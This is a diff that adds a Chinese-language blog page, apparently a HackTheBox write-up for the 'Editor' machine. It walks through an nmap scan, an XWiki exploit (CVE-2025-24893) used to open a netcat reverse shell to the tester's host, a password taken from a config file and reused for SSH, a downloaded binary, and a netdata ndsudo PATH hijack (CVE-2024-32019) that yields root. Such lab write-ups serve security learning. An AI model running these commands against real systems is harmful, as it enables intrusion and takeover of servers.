@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="Hu9Do8Tx47t851t8Rdk0NlwZL3UeW0wOkTbVzqLFU9w">
+  <meta name="msvalidate.01" content="A35AD8AE43092D6BAF78D36FAC56B4DD">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"ry0ma24.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.23.0","exturl":true,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content=".orykvwmrubaa{zoom:50%;}">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-Editor">
+<meta property="og:url" content="https://ry0ma24.github.io/posts/fe14f7bb.html">
+<meta property="og:site_name" content="相忘于江湖">
+<meta property="og:description" content=".orykvwmrubaa{zoom:50%;}">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ry0ma24.github.io/posts/fe14f7bb/ba9dec0d022d3c3b6a96aa5dba4772c7-1755522406355-3.png">
+<meta property="og:image" content="https://ry0ma24.github.io/posts/fe14f7bb/image-20250818201422605.png">
+<meta property="og:image" content="https://ry0ma24.github.io/posts/fe14f7bb/image-20250818205632670.png">
+<meta property="article:published_time" content="2025-08-18T13:17:01.000Z">
+<meta property="article:modified_time" content="2025-08-18T13:20:03.516Z">
+<meta property="article:author" content="Ry0ma24">
+<meta property="article:tag" content="CVE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ry0ma24.github.io/posts/fe14f7bb/ba9dec0d022d3c3b6a96aa5dba4772c7-1755522406355-3.png">
+
+
+<link rel="canonical" href="https://ry0ma24.github.io/posts/fe14f7bb.html">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://ry0ma24.github.io/posts/fe14f7bb.html","path":"posts/fe14f7bb.html","title":"HTB-Editor"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>HTB-Editor | 相忘于江湖</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="相忘于江湖" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">相忘于江湖</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">人生天地之间，若白驹之过隙，忽然而已</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Nmap-Scan"><span class="nav-number">1.</span> <span class="nav-text">Nmap Scan</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">3.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">4.</span> <span class="nav-text">权限提升</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ry0ma24"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Ry0ma24</p>
+  <div class="site-description" itemprop="description">好好活动，好好学习，好好游戏，好好吃饭，好好休息，要过一个开心有趣，精神百倍的人生</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">33</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3lvdXJuYW1l" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yourname"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOnlvdXJuYW1lQGdtYWlsLmNvbQ==" title="E-Mail → mailto:yourname@gmail.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ry0ma24.github.io/posts/fe14f7bb.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Ry0ma24">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="相忘于江湖">
+      <meta itemprop="description" content="好好活动，好好学习，好好游戏，好好吃饭，好好休息，要过一个开心有趣，精神百倍的人生">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="HTB-Editor | 相忘于江湖">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HTB-Editor
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-08-18 21:17:01 / 修改时间：21:20:03" itemprop="dateCreated datePublished" datetime="2025-08-18T21:17:01+08:00">2025-08-18</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Hackthebox/" itemprop="url" rel="index"><span itemprop="name">Hackthebox</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><style>.orykvwmrubaa{zoom:50%;}</style><img src="/posts/fe14f7bb/ba9dec0d022d3c3b6a96aa5dba4772c7-1755522406355-3.png" class="orykvwmrubaa" alt="HTB-Editor">
+
+<span id="more"></span>
+
+<table>
+<thead>
+<tr>
+<th>OS</th>
+<th>Difficulty</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Linux</td>
+<td>Easy</td>
+</tr>
+</tbody></table>
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.11.80 <span class="token parameter variable">-sC</span> <span class="token parameter variable">-sV</span> -p- --min-rate <span class="token number">1000</span>
+Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-08-18 <span class="token number">19</span>:58 CST
+Warning: <span class="token number">10.10</span>.11.80 giving up on port because retransmission cap hit <span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>.
+Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.11.80
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.12s latency<span class="token punctuation">)</span>.
+Not shown: <span class="token number">65405</span> closed tcp ports <span class="token punctuation">(</span>conn-refused<span class="token punctuation">)</span>, <span class="token number">127</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
+PORT     STATE SERVICE VERSION
+<span class="token number">22</span>/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">8</span>.9p1 Ubuntu 3ubuntu0.13 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
+<span class="token operator">|</span> ssh-hostkey: 
+<span class="token operator">|</span>   <span class="token number">256</span> 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>_  <span class="token number">256</span> <span class="token number">64</span>:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
+<span class="token number">80</span>/tcp   <span class="token function">open</span>  http    nginx <span class="token number">1.18</span>.0 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
+<span class="token operator">|</span>_http-server-header: nginx/1.18.0 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
+<span class="token operator">|</span>_http-title: Did not follow redirect to http://editor.htb/
+<span class="token number">8080</span>/tcp <span class="token function">open</span>  http    Jetty <span class="token number">10.0</span>.20
+<span class="token operator">|</span> http-title: XWiki - Main - Intro
+<span class="token operator">|</span>_Requested resource was http://10.10.11.80:8080/xwiki/bin/view/Main/
+<span class="token operator">|</span>_http-server-header: Jetty<span class="token punctuation">(</span><span class="token number">10.0</span>.20<span class="token punctuation">)</span>
+<span class="token operator">|</span> http-robots.txt: <span class="token number">50</span> disallowed entries <span class="token punctuation">(</span><span class="token number">15</span> shown<span class="token punctuation">)</span>
+<span class="token operator">|</span> /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
+<span class="token operator">|</span> /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
+<span class="token operator">|</span> /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
+<span class="token operator">|</span> /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
+<span class="token operator">|</span> /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
+<span class="token operator">|</span>_/xwiki/bin/undelete/
+<span class="token operator">|</span>_http-open-proxy: Proxy might be redirecting requests
+<span class="token operator">|</span> http-webdav-scan: 
+<span class="token operator">|</span>   Server Type: Jetty<span class="token punctuation">(</span><span class="token number">10.0</span>.20<span class="token punctuation">)</span>
+<span class="token operator">|</span>   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
+<span class="token operator">|</span>_  WebDAV type: Unknown
+<span class="token operator">|</span> http-cookie-flags: 
+<span class="token operator">|</span>   /: 
+<span class="token operator">|</span>     JSESSIONID: 
+<span class="token operator">|</span>_      httponly flag not <span class="token builtin class-name">set</span>
+<span class="token operator">|</span> http-methods: 
+<span class="token operator">|</span>_  Potentially risky methods: PROPFIND LOCK UNLOCK
+Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
+Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">84.32</span> seconds
+</code></pre>
+
+<p>添加本地域名映射</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'10.10.11.80 editor.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts  </code></pre>
+
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问 <span class="exturl" data-url="aHR0cDovL2VkaXRvci5odGI6ODA4MC94d2lraS9iaW4vdmlldy9NYWluLw==">http://editor.htb:8080/xwiki/bin/view/Main/<i class="fa fa-external-link-alt"></i></span> 可以看到目标是XWiki 15.10.8 ，通过Google可以检索到CVE-2025-24893，下载poc</p>
+<img src="/posts/fe14f7bb/image-20250818201422605.png" class="" title="image-20250818201422605">
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ python3 CVE-2025-24893.py <span class="token parameter variable">--url</span> <span class="token string">"http://editor.htb:8080/xwiki"</span> <span class="token parameter variable">--command</span> <span class="token string">"id"</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending request to web server
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Output:
+
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">997</span><span class="token punctuation">(</span>xwiki<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">997</span><span class="token punctuation">(</span>xwiki<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">997</span><span class="token punctuation">(</span>xwiki<span class="token punctuation">)</span>
+
+$ python3 CVE-2025-24893.py <span class="token parameter variable">--url</span> <span class="token string">"http://editor.htb:8080/xwiki"</span> <span class="token parameter variable">--command</span> <span class="token string">"busybox nc 10.10.16.19 7777 -e /bin/bash"</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending request to web server
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Output:
+</code></pre>
+
+<p>GetShell</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">7777</span>                                                                   
+Listening on <span class="token number">0.0</span>.0.0 <span class="token number">7777</span>
+Connection received on <span class="token number">10.10</span>.11.80 <span class="token number">58828</span>
+
+<span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">997</span><span class="token punctuation">(</span>xwiki<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">997</span><span class="token punctuation">(</span>xwiki<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">997</span><span class="token punctuation">(</span>xwiki<span class="token punctuation">)</span>
+</code></pre>
+
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>收集账号</p>
+<pre class="language-none"><code class="language-none">xwiki@editor:&#x2F;usr&#x2F;lib&#x2F;xwiki$ ls &#x2F;home
+oliver</code></pre>
+
+<p>查找配置文件，可以找到一个密码</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">xwiki@editor:/usr/lib/xwiki/WEB-INF$ <span class="token function">cat</span> hibernate.cfg.xml <span class="token operator">|</span> <span class="token function">grep</span> password
+<span class="token function">cat</span> hibernate.cfg.xml <span class="token operator">|</span> <span class="token function">grep</span> password
+    <span class="token operator">&lt;</span>property <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"hibernate.connection.password"</span><span class="token operator">></span>theEd1t0rTeam9<span class="token operator"><span class="token file-descriptor important">9</span>&lt;</span>/property<span class="token operator">></span>
+   	<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
+    <span class="token operator">&lt;</span>property <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"hibernate.connection.password"</span><span class="token operator">></span><span class="token operator">&lt;</span>/property<span class="token operator">></span></code></pre>
+
+<p>使用账号oliver和配置文件中的密码登录ssh</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ssh</span> oliver@editor.htb                  
+The authenticity of <span class="token function">host</span> <span class="token string">'editor.htb (10.10.11.80)'</span> can't be established.
+<span class="token operator">&lt;</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span> <span class="token operator">></span>
+Last login: Mon Aug <span class="token number">18</span> <span class="token number">12</span>:08:23 <span class="token number">2025</span> from <span class="token number">10.10</span>.16.19
+oliver@editor:~$ <span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>oliver<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>oliver<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>oliver<span class="token punctuation">)</span>,999<span class="token punctuation">(</span>netdata<span class="token punctuation">)</span></code></pre>
+
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>查找特殊权限的文件，找到一个<code>/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo</code> ,通过检索可以找到CVE-2024-32019</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">oliver@editor:~$ <span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> /4000 <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
+/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
+/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
+/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
+/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
+/opt/netdata/usr/libexec/netdata/plugins.d/ioping
+/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
+/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
+/usr/bin/newgrp
+<span class="token operator">&lt;</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token operator">></span>
+/usr/libexec/polkit-agent-helper-1</code></pre>
+
+<img src="/posts/fe14f7bb/image-20250818205632670.png" class="" title="image-20250818205632670">
+
+<p>编译并上传到目标，执行 <code> /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list</code>  成功提权</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">oliver@editor:/tmp$ <span class="token function">wget</span> http://10.10.16.19:8000/nvme
+--2025-08-18 <span class="token number">12</span>:20:30--  http://10.10.16.19:8000/nvme
+Connecting to <span class="token number">10.10</span>.16.19:8000<span class="token punctuation">..</span>. connected.
+HTTP request sent, awaiting response<span class="token punctuation">..</span>. <span class="token number">200</span> OK
+Length: <span class="token number">16048</span> <span class="token punctuation">(</span>16K<span class="token punctuation">)</span> <span class="token punctuation">[</span>application/octet-stream<span class="token punctuation">]</span>
+Saving to: ‘nvme’
+
+nvme                   <span class="token number">100</span>%<span class="token punctuation">[</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span><span class="token punctuation">]</span>  <span class="token number">15</span>.67K  --.-KB/s    <span class="token keyword">in</span> <span class="token number">0</span>.09s   
+
+<span class="token number">2025</span>-08-18 <span class="token number">12</span>:20:31 <span class="token punctuation">(</span><span class="token number">176</span> KB/s<span class="token punctuation">)</span> - ‘nvme’ saved <span class="token punctuation">[</span><span class="token number">16048</span>/16048<span class="token punctuation">]</span>
+
+oliver@editor:/tmp$ <span class="token function">chmod</span> +x /tmp/nvme
+oliver@editor:/tmp$ <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/tmp:<span class="token environment constant">$PATH</span>
+oliver@editor:/tmp$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
+root@editor:/tmp<span class="token comment"># id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>,999<span class="token punctuation">(</span>netdata<span class="token punctuation">)</span>,1000<span class="token punctuation">(</span>oliver<span class="token punctuation">)</span></code></pre>
+
+
+
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Path</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>flag1</td>
+<td>&#x2F;home&#x2F;oliver&#x2F;user.txt</td>
+</tr>
+<tr>
+<td>flag2</td>
+<td>&#x2F;root&#x2F;root.txt</td>
+</tr>
+</tbody></table>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CVE/" rel="tag"># CVE</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/posts/f52f847.html" rel="prev" title="HTB-Bashed">
+                  <i class="fa fa-angle-left"></i> HTB-Bashed
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Ry0ma24</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZw==">NexT.Gemini</span> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
